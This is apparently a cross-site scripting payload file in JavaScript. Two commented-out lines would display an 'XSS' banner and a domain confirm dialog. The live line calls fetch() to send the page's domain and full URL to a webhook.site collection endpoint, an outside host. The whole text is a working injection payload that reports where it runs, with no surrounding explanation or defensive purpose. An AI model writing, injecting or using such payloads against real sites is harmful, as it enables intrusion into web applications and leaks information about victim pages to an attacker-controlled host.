//document.body.insertAdjacentHTML('afterbegin','<h1 style="position:fixed;z-index:99999;background:white;color:red;top:0;left:0">XSS</h1>');
//confirm(document.domain);

fetch('https://webhook.site/15524a9b-7e50-4fa2-aa60-3b61dbd603f3/hit?d=' + encodeURIComponent(document.domain) + '&url=' + encodeURIComponent(location.href));
